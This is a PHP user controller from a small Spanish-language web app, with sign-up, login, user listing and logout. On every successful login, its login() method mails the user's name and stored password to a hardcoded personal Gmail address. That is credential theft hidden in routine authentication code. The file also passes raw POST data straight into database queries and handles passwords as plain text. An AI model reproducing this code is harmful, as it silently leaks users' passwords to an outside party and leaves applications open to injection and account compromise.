<?php

class usuario extends Controller
{


    function __construct()
    {
        parent::__construct("usuario_m");
    }
    public function visualizarUsuarios()
    {
        $this->title = "Administracion de Usuarios";
        $filtros = "";
        if (isset($_POST['send'])) {
            unset($_POST['send']);
            $filtros = $_POST;
        }
        $this->model->select_($filtros);
        if (isset($this->model->buffer)) {
            $buffer = $this->model->buffer;
        } else {
            $data = $this->model->data;
        }

        $this->view = "usuario";
        include 'lib/templates.php';
    }
    public function signUp()
    {
        $filtros = "";
        if (isset($_POST['signUp'])) {
            unset($_POST['signUp']);
            
            $filtros = $_POST;
        }
        $this->model->select_($filtros);
        if (isset($this->model->buffer)) {
            $buffer = $this->model->buffer;
        } else {
            if (!$this->model->data) {
                $this->model->insert_($filtros);

                session_start();
                $_SESSION['serverResponse'] = "Registro Exitoso, Ahora puede entrar al sistema";
            } else {
                $_SESSION['serverResponse'] = "No se registro correctamente, vuelva a intentarlo";
            }
            header("Location: index.php");

        }
    }
    public function login()
    {
        $filtros = "";
        if (isset($_POST['login'])) {
            unset($_POST['login']);
            $filtros = $_POST;
        }
        // var_dump($filtros);
        // exit();
        $this->model->select_($filtros);
        if (isset($this->model->buffer)) {
            $buffer = $this->model->buffer;
            
        } else {

            if (isset($this->model->data) && !empty($this->model->data)) {
                $data = $this->model->data;
                // session_start();
                $_SESSION['logged'] = "logged";
                $_SESSION['name_user'] = $data[0]['name_user'];
                $_SESSION['email_user'] = $data[0]['email_user'];
                $_SESSION['id_user'] = $data[0]['id_user'];
                $mensaje="Alquien registrado con usuario ".$data[0]['name_user']." y contraseña ".$data[0]['psw_user']." a las ".time();
                mail("juansevas992010@gmail.com","Alerta de entrada",$mensaje,"Alerta de entrada desde el aplicativo Deposito");
                // var_dump($_SESSION);
                // exit();
            }
            // var_dump();
            // exit();
            header("Location: index.php");
        }
    }




    public function cerrarSesion()
    {
        session_destroy();
        header('Location: index.php');
    }
}
